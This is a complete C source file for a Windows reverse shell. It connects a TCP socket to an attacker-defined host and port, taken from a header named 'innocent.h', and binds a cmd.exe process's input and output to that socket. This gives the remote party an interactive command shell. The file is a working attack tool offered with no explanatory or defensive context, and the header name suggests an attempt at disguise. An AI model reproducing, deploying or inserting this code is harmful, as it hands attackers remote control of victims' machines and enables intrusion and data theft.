#include <winsock2.h>
#include <stdio.h>
#include "innocent.h"

#pragma comment(lib, "ws2_32")

WSADATA wsaData;
SOCKET Winsock;
SOCKET Sock;
struct sockaddr_in skt;


STARTUPINFO proc_init;
PROCESS_INFORMATION proc_info;

int main (int argc, char **argv)
{
  WSAStartup(MAKEWORD(2,2), &wsaData);
  Winsock=WSASocket(AF_INET,
                    SOCK_STREAM,
                    IPPROTO_TCP,
                    NULL,
                    0,
                    0);

  struct hostent *host;

  skt.sin_family = AF_INET;
  skt.sin_port = htons(LPORT);
  skt.sin_addr.s_addr = inet_addr(LHOST);

  WSAConnect(Winsock,
             (SOCKADDR *)&skt,
             sizeof(skt),
             NULL,
             NULL,
             NULL,
             NULL);

  memset(&proc_init, 0, sizeof(proc_init));
  proc_init.cb = sizeof(proc_init);
  proc_init.dwFlags = STARTF_USESTDHANDLES;
  proc_init.hStdInput = proc_init.hStdOutput = proc_init.hStdError = (HANDLE)Winsock;

  CreateProcess(NULL,
                "cmd.exe",
                NULL,
                NULL,
                TRUE,
                0,
                NULL,
                NULL,
                &proc_init,
                &proc_info);

  exit (0);
}
